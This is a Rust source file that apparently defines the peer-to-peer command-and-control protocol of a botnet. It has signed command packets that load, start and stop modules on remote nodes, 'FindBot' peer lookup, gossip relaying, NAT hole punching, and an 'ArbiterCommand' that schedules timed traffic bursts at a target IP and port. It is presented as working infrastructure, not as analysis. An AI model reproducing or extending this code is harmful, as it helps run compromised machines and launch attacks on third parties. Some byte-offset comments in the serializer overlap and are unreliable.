use serde::{Deserialize, Serialize};
use ed25519_dalek::{Signer, Verifier, Signature, SigningKey, VerifyingKey};
use serde_big_array::BigArray;

// --- Binary Protocol Constants (Synced with C) ---
pub const PROTOCOL_MAGIC: u32 = 0x9A1D3F7C;
pub const PACKET_TYPE_GOSSIP: u8 = 1;
pub const PACKET_TYPE_CMD: u8 = 2;

#[derive(Debug, Serialize, Deserialize, Clone)]
pub enum CommandType {
    Heartbeat = 0x03,
    LoadModule = 0x04,
    StartModule = 0x05,
    StopModule = 0x06,
}

pub type GhostPacket = PhantomPacket;

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct CommandPayload {
    pub id: String,
    pub action: String,
    pub parameters: String,
    pub reply_to: Option<String>,
    pub execute_at: i64,
}

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct Registration {
    pub pub_key: String,
    pub peer_address: String,
    pub signature: String,
    pub pow_nonce: u64,
    pub timestamp: i64,
}

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct AckPayload {
    pub command_id: String,
    pub status: String,
    pub details: String,
}

#[derive(Debug, Serialize, Deserialize, Clone, PartialEq)]
pub struct PeerInfo {
    pub peer_address: String,
    pub pub_key: String,
    pub last_seen: i64,
    pub capacity: u8,
}

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct GossipMsg {
    pub id: String,
    pub packet: PhantomPacket,
    pub ttl: u32,
}

/// NAT hole punching signaling protocol
#[derive(Debug, Serialize, Deserialize, Clone)]
pub enum SignalMsg {
    RequestPunch { target_peer_id: String },
    Ping { timestamp: u64 },
    Pong { timestamp: u64 },
    ArbiterCommand {
        target_ip: String,
        target_port: u16,
        fire_delay_ms: u64,
        burst_duration_ms: u64,
    },
    PunchResult { success: bool, peer_id: String },
}

#[derive(Debug, Serialize, Deserialize, Clone)]
pub enum MeshMsg {
    Register(Registration),
    GetPeers,
    Peers(Vec<PeerInfo>),
    ClientHello { ephemeral_pub: String },
    ServerHello { ephemeral_pub: String },
    Gossip(GossipMsg),
    FindBot { target_id: String },
    FoundBot { nodes: Vec<PeerInfo> },
    Ack(AckPayload),
    Signal(SignalMsg),
}

// --- Binary Protocol Packet (Matches C) ---
#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct PhantomPacket {
    pub magic: u32,       // 4 bytes
    pub ptype: u8,        // 1 byte (2 for CMD)
    pub nonce: u32,       // 4 bytes
    #[serde(with = "BigArray")]
    pub signature: [u8; 64],
    pub data: Vec<u8>,    // Payload
}

impl PhantomPacket {
    pub fn new_cmd(nonce: u32, data: Vec<u8>, key: &SigningKey) -> Self {
        let mut packet = Self {
            magic: PROTOCOL_MAGIC,
            ptype: PACKET_TYPE_CMD,
            nonce,
            signature: [0u8; 64],
            data,
        };
        packet.sign(key);
        packet
    }

    pub fn sign(&mut self, key: &SigningKey) {
        // C logic: Verify(payload, sig) - Payload Only
        let sig = key.sign(&self.data);
        self.signature = sig.to_bytes();
    }

    pub fn verify(&self, key: &VerifyingKey) -> bool {
        if self.magic != PROTOCOL_MAGIC { return false; }
        // C logic: Verify(payload, sig)
        let sig_obj = Signature::from_bytes(&self.signature);
        key.verify(&self.data, &sig_obj).is_ok()
    }

    /// Helper to get binary bytes for P2P transport
    pub fn to_bytes(&self) -> Vec<u8> {
        let mut buf = Vec::new();
        buf.extend_from_slice(&self.magic.to_be_bytes()); // 0-3
        buf.push(self.ptype);                             // 4
        
        // C struct: [Nonce(4)] [Sig(64)] [Len(2)] [Payload...]
        // Note: C implementation handled Type check *before* casting struct.
        // buffer[4] is Type.
        // If Type == CMD (2):
        // Offset 5 starts Nonce.
        
        buf.extend_from_slice(&self.nonce.to_be_bytes()); // 5-8
        buf.extend_from_slice(&self.signature);           // 9-73
        
        let len = self.data.len() as u16;
        buf.extend_from_slice(&len.to_be_bytes());        // 73-75
        
        buf.extend_from_slice(&self.data);                // 75...
        buf
    }
}
